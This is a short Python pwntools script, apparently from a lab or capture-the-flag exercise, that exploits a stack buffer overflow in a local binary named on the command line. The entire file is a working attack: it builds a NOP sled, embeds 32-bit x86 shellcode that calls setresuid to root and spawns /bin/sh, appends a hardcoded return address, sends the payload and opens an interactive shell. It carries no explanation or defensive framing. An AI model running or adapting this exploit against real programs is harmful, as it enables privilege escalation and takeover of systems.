from pwn import *
import time
import os
import sys


def main():
    target = sys.argv[1]; print("target is", target)
    target = './' + target

    elf = ELF(target)

    offset = 316; print("offset is", offset)
    nop = b'\x90'; print("nop sled is", nop)
    nop_num = 205; print("number of nop is", nop_num)
    payload = b'\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80'; print("payload is", payload)
    buffer = b'\x84\xce\xff\xff'; print("buffer location is", buffer)
    buffer_num = 19; print("number of buffer is", buffer_num)

    comp_payload = nop*nop_num + payload + buffer*buffer_num
    print("\n\nmaking paylaod...\n\nlength of payload is", len(comp_payload))
    io = process(target)
    print("process is running... \nsend paylaod...")
    io.sendline(comp_payload)

    print("now exploit!!\n\n")
    io.interactive()

if __name__ == "__main__":
    main()
